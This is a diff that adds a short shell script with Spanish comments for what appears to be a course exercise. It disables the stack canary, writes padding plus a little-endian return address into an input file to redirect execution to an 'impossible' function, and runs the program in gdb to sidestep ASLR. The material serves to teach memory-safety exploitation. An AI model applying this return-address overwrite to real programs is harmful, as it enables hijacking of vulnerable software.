@@ -1,0 +1,13 @@
+# compilar sin stack canary
+gcc 8.03.c -o 8.03 -fno-stack-protector
+
+# armar input (ojo endianness)
+# dirige a 0x00005555555551cd, que es la funcion imposible en mi compilacion
+# para ver la direccion, se puede hacer:
+# gdb ./8.03 
+#   disassemble main
+echo -e -n 'fedefedefede\xcd\x51\x55\x55\x55\x55\x00\x00' > hola.txt
+
+# desde gdb, para evitar ASLR
+gdb ./8.03
+run < hola.txt
